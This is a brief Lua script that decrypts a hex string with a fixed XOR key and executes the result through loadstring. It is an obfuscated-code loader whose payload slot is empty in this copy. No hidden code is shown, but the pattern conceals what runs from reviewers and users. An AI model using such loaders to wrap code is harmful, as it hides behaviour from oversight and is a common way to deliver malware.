local k={115,180,223,237,185,36,255,8,152,117,5,60,26,20,57,170,114,133,22,76,46,19,248,28,238,18,30,80,37,173,164,92}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
